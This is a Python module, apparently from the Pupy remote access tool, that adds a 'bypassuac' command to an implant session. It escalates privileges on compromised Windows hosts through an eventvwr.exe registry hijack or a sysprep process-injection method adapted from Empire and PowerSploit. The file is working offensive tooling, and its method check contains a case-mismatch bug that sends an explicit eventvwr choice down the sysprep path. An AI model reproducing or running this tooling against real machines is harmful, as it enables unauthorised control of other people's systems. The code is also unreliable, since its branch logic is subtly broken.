# -*- coding: UTF8 -*-
#by @bobsesq

import os
from pupylib.PupyModule import *
from rpyc.utils.classic import upload
from modules.lib.windows.bypassuac import bypassuac
__class_name__="BypassUAC"

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

@config(compat="windows", category="privesc")
class BypassUAC(PupyModule):
    """ try to bypass UAC with Invoke-BypassUAC.ps1, from Empire """
    dependencies=["psutil", "pupwinutils.processes"]
    METHODS = ["eventvwr", "sysprep"]
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)
        self.arg_parser.add_argument('-m', dest='method', choices=self.METHODS, default=None, help="Use a specific method. 'sysprep' can be used for wind7-8.1 (no wind10) and 'eventvwr' for wind7-10. By default, 'sysprep' for wind7-8.1 targets and 'eventvwr' for wind10. ")

    def run(self, args):
		if self.client.desc['proc_arch'] == '32bit' and self.client.conn.modules['pupwinutils.processes'].is_x64_architecture():
			self.error("You are using a x86 process while the os architecture is x64")
			self.error("Migrate to a x64 process before trying to bypass UAC")
		elif args.method == "Eventvwr" or (self.client.desc['release'] == '10' and args.method == None):
			self.success("Trying to bypass UAC with Eventvwr method (UAC Bypass using eventvwr.exe and Registry Hijacking), wind7-10 targets...")
			bypassUasModule = bypassuac(self, rootPupyPath=ROOT)
			bypassUasModule.bypassuac_through_EventVwrBypass()
		else:
			self.success("Trying to bypass UAC with sysprep method (bypass UAC using the trusted publisher certificate through process injection), wind7-8.1 targets...")
			bypassUasModule = bypassuac(self, rootPupyPath=ROOT)
			bypassUasModule.bypassuac_through_PowerSploitBypassUAC()
